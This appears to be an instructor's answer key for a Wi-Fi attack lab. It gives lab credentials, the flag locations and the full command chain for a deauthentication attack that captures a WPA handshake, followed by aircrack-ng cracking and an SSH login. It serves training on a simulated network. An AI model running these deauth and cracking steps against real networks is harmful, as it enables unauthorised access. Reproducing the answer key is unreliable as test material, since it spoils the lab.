# Coach context — wifi-t2-live-attack

## Ground truth
- `wifilab01` 10.x.10.25 — `wifi`/`WifiLab-24!`, sudo.
- hwsim: wlan0 AP `corp-wifi` ch6 (hostapd), wlan2 client stays
  associated and auto-rejoins when deauthed, wlan1 free for attacker.
- PSK `sunshine2024` in `/opt/wifi/wordlist.txt`.
- `wifi-admin` password = sunshine2024; flag `/home/wifi-admin/flag.txt`.
- Command flag: `/home/wifi/psk.txt` greps `sunshine2024`.

## Expected solve
```bash
ssh wifi@10.x.10.25
sudo airmon-ng start wlan1            # or: sudo iw wlan1 set monitor none
sudo airodump-ng -c 6 --bssid <AP> -w /home/wifi/capture wlan1mon
# watch for STATION (wlan2 client MAC)
sudo aireplay-ng -0 3 -a <AP> -c <CLIENT> wlan1mon
# airodump shows "WPA handshake: <BSSID>"
aircrack-ng -w /opt/wifi/wordlist.txt /home/wifi/capture-01.cap
echo sunshine2024 > /home/wifi/psk.txt
sshpass -p sunshine2024 ssh wifi-admin@localhost
```

## Coach guidance
- Client MAC visible in airodump STATION column — without `-c`, deauth can
  broadcast (still works, sloppier).
- The client re-associates instantly after a deauth — that's the whole
  mechanic. No passive handshake without kicking it first.
- airmon-ng may rename wlan1 → wlan1mon; teach `iw dev` to check names.
- `iw` on the lab is provisioned — no installs needed.
